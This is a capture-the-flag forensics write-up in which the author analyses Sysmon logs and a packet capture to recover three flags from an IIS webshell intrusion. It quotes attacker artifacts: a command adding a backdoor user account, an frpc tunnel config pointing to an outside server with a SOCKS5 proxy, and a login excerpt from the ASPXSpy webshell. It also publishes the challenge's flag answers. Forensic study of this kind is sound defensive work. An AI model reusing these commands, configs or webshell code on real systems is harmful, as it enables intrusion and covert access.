**Category**: Forensics  
**Author**: Ben Folland

![](./files/01%20-%20Webshellz/01%20-%20Webshellz.png)

---

The challenge ZIP contained three files: `HTTP.log`, `Sysmon.evtx` and `Traffic.pcapng`.

The first flag could be found by simply running [Chainsaw](https://github.com/WithSecureLabs/chainsaw):

```
> .\chainsaw.exe hunt samples/ -s sigma/ -m mappings/sigma-event-logs-all.yml -o hunt.json --json

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading detection rules from: sigma/
[!] Loaded 2842 detection rules (306 not loaded)
[+] Loading forensic artefacts from: samples/ (extensions: .evtx, .evt)
[+] Loaded 1 forensic artefacts (1.1 MiB)
[+] Current Artifact: samples/Sysmon.evtx
[+] Hunting [========================================] 1/1 - [00:00:00]                                                         [+] Writing results to output file...
[+] 10 Detections found on 8 documents
```

I tossed the output into this [JSON formatter](https://jsonformatter.org/) and found this on line 663:

```
...
"CommandLine": "net  user IIS_USER VJGSuERc6qYAYPdRc556JTHqxqWwLbPwzABc0XgIhgwYEWdQji1 /add"
...
```

I initially thought that was base64, but it wasn't. [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base62('0-9A-Za-z')&input=VkpHU3VFUmM2cVlBWVBkUmM1NTZKVEhxeHFXd0xiUHd6QUJjMFhnSWhnd1lFV2RRamkx&oeol=FF) decoded it as base62.

Flag #1: **flag{03638631595684f0c8c461c24b0879e6}**

---

The second flag's description had a hint: capitalization. `Funky Random Program` (FRP). Searching the Chainsaw output for `frp`:

```
...
"Image": "C:\\ProgramData\\frpc.exe",
...
"CommandLine": "frpc.exe  -c frpc.ini",
...
```

Digging into the packet capture, in HTTP stream #3 I could see the attacker uploading a file to the server named revshell.aspx. It ended up being ASPXSpy2014, which was linked to a Chinese APT campaign. In HTTP stream #7 I found `frpc.ini` being uploaded via that webshell:

```
-----------------------------25171422002747893140873671254
Content-Disposition: form-data; name="Bin_Lable_File"; filename="frpc.ini"
Content-Type: application/octet-stream

[common]
server_addr = 117.72.105.10
server_port = 7000 # MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===

[sock5]
type = tcp
plugin = socks5
remote_port = 6000
```

Again, this looked like base64, but it wasn't. [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',true)&input=TVpXR0NaMzNNTTNXRVlKWEdaUlRBWUpVR1E0RElaVEZIQlJUQ01aVk1FWVRDT0pWTVU0R0lPSlVNVlNIMj09PQ&oeol=FF) decoded it as base32.

Flag #2: **flag{c7ba76c0a4484fe8c135a1195e8d94ed}**

---

The final flag comes from a login attempt. Looking at `revshell.aspx`:

```C#
protected void Bin_Button_Login_Click(object sender,EventArgs e)
{
	string MD5Pass=FormsAuthentication.HashPasswordForStoringInConfigFile(Bin_TextBox_Login.Text,"MD5").ToLower();
	if(MD5Pass==Password)
	{
		Response.Cookies.Add(new HttpCookie(Version,Password));
		Bin_Div_Login.Visible=false;
		Bin_Main();
	}
	else
	{
		Bin_Login();
	}
}
```

I then decided to filter the capture on `http` and search for `Bin_TextBox_Login`.

![](./files/01%20-%20Webshellz/01.png)

This time the encoding *actually* was base64.

```
$ echo ZmxhZ3tmYjRlMDc4YTczOWFjNGNlNjg3ZWI3OGMyZTUxYWFmZX0= | base64 -d     
flag{fb4e078a739ac4ce687eb78c2e51aafe}
```

Flag #3: **flag{fb4e078a739ac4ce687eb78c2e51aafe}**

---

**Files:**
- [HTTP.log](./files//01%20-%20Webshellz/HTTP.log)
- [hunt.json](./files//01%20-%20Webshellz/hunt.json)
- [revshell.aspx](./files//01%20-%20Webshellz/revshell.aspx)
- [Sysmon.evtx](./files//01%20-%20Webshellz/Sysmon.evtx)
- [Traffic.pcapng](./files//01%20-%20Webshellz/Traffic.pcapng)
- [webshellz.zip](./files//01%20-%20Webshellz/webshellz.zip)